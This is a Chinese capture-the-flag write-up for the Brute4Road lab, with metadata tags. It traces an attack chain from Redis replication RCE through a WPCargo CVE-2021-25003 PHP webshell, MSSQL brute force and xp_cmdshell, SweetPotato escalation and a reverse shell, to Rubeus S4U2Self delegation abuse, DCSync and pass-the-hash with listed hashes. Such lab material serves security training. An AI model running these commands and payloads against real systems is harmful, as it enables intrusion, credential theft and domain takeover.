---
title: 春秋云镜——Brute4Road Writeup
contest: 春秋云镜靶场
year: 2022
difficulty: medium
vuln_type: rce
tags: [Redis主从复制, SUID提权, base64, CVE-2021-25003, WPCargo RCE, MSSQL xpcmdshell, SweetPotato, 约束性委派攻击, Rubeus S4U2Self, DCSync]
attack_chain: Redis主从复制getshell→base64 SUID读flag1→内网frp代理→wpscan扫到WPCargo 6.x→CVE-2021-25003未授权RCE→MSSQL爆破ElGNkOiC→xpcmdshell+Ole Automation Procedures→SweetPotato提权system→mimikatz导出MSSQLSERVER$ NT hash→Rubeus asktgt→S4U2Self申请LDAP票据→DCSync导出域管→wmiexec登录DC
key_payload: "exploit/linux/redis/redis_replication_cmd_exec;base64 \"/home/redis/flag/flag01\";CVE-2021-25003 wpcargo barcode.php;SweetPotato.exe -a;Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352;kerberos::golden /ptt;lsadump::dcsync /user:Administrator"
one_liner: 春秋云镜Brute4Road：Redis主从+SUID+WPCargo RCE+约束性委派Rubeus S4U2Self+DCSync
lesson: 域内机器账户+约束性委派可被Rubeus S4U2Self扩展代表域管访问LDAP服务导出域内凭据
quality: high
---

# 春秋云镜——Brute4Road Writeup

**靶场**：春秋云镜Brute4Road（中难，多flag）

**完整攻击链**：

**Flag1（入口机47.92.135.138）**：
- fscan扫到 21/22/80/6379
- FTP匿名 + Redis未授权
- `use exploit/linux/redis/redis_replication_cmd_exec` MSF主从复制getshell
- SUID提权：`find / -user root -perm -4000` 发现base64 SUID
- `base64 "/home/redis/flag/flag01" | base64 --decode` 读flag

**Flag2（内网172.22.2.18）**：
- proxychains wpscan → 发现wpcargo 6.x插件
- **CVE-2021-25003** 未授权RCE：barcode.php接受text参数写入png → png解压触发 `<?=$_GET[1]($_POST[2]);?>`
- 武器化脚本生成恶意payload
- 写shell到 wp-conf.php：`http://172.22.2.18/wp-content/wp-conf.php?1=system` POST `2=whoami`
- www-data用户

**Flag3（内网MSSQL）**：
- 翻wp-config.php拿到数据库账号密码
- 密码表爆破MsSQL → `ElGNkOiC`
- MSSQL xpcmdshell（低权限）→ 激活Ole Automation Procedures
- 上传SweetPotato.exe提权到system
- msf reverse_tcp + tcptunnel端口转发上线CS马
- 添加管理员账户 RDP连接

**Flag4（域控DC）**：
- mimikatz导出MSSQLSERVER$机器账户NT hash: `cea3e66a2715c71423e7d3f0ff6cd352`
- MSSQLSERVER机器配置到DC的 LDAP+CIFS 服务的**约束性委派**
- **Rubeus申请机器账户TGT**：
  ```
  Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 
    /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
  ```
- **S4U2Self扩展代表域管请求LDAP票据**（LDAP有DCSync权限）
- mimikatz dcsync导出域管hash: `1a19251fbd935969832616366ae3fe62`
- `wmiexec.py -hashes :1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3`

**关键技术栈**：
- Redis 4.0+主从复制RCE
- base64 SUID提权（GTFOBins）
- WPCargo 6.x未授权RCE (CVE-2021-25003)
- MSSQL xpcmdshell + Ole Automation Procedures
- SweetPotato提权
- 约束性委派 + Rubeus S4U2Self攻击

**质量评估**：高（命令payload完整，4 flag + 委派攻击链清晰）
